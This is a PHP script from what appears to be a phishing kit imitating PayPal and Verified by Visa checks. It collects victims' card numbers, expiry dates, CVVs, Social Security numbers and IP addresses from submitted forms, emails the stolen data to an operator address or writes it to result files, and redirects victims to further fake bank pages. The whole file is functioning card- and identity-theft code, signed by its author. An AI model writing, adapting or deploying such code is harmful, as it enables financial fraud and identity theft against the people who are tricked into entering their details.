<?php


/*

 */
session_start();
include 'antibots.php';
include 'config.php';


if(isset($_POST['vbv_ready'])){

    if(isset($_POST['vbv_ready']) == true){

        $cardnumber = $_SESSION['cardNumber'] = $_POST['cardNumber'];
        $date_ex = $_SESSION['date_ex'] = $_POST['date_ex'];
        $cvv = $_SESSION['cvv'] = $_POST['cvv'];
        $ssn = $_SESSION['ssn'] = $_POST['ssn'];
        $iP_adress = $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
        include('type_card.php');
        $Info_LOG = "
|---------------- Card-Billing ---------------|
|Type Card        : $type_de_cartes
|Card Number      : $cardnumber
|Date EX          : $date_ex
|CVV              : $cvv
|SSN              : $ssn
|IP Adresse       : $iP_adress";


        // Don't Touche
//Email
        if($Send_Email !== 1 ){}else{
            $subject = 'Card Info From '.$iP_adress.' ';
            $headers = 'From: card' . "\r\n" .
                'X-Mailer: PHP/' . phpversion();
            mail($to, $subject, $Info_LOG, $headers);
            header("location:vbv_verif.php?websrc=".md5('nOobn')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }

//FTP
        if($Ftp_Write !== 1 ){}else{
            $file = fopen("rst/Result." . $IP_Connected . ".txt", 'a');
            fwrite($file, $Info_LOG);
            header("location:vbv_verif.php?websrc=".md5('nOobn')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }
        header("location:verif_vbv.php?y".md5('nassimdz')."");
    }




else{

        $cardnumber =  $_SESSION['cardNumber'] = $_POST['cardNumber'];
        $date_ex = $_POST['date_ex'];
        $cvv = $_POST['cvv'];
        $ssn = $_POST['ssn'];
        $iP_adress = $_SERVER['REMOTE_ADDR'];
        include('type_card.php');
        $Info_LOG = "
|---------------- Card-Billing ---------------|
|Type Card        : $type_de_cartes
|Card Number      : $cardnumber
|Date EX          : $date_ex
|CVV              : $cvv
|SSN              : $ssn
|IP Adresse       : $iP_adress
|---------------------------------------------|
|--------------By [OuNi XhacK]--------------|
";





// Don't Touche
//Email
        if($Send_Email !== 1 ){}else{
            $subject = 'New PayPal Card : card '.$iP_adress.' ';
            $headers = 'From: gredadridi@gmail.com' . "\r\n" .
                'X-Mailer: PHP/' . phpversion();
            mail($to, $subject, $Info_LOG, $headers);
           header("location:bank_info.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }

//FTP
        if($Ftp_Write !== 1 ){}else{
            $file = fopen("rst/Result-By-OuNi-XhacK." . $IP_Connected . ".txt", 'a');
            fwrite($file, $Info_LOG);
            header("location:bank_info.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }
    }

}





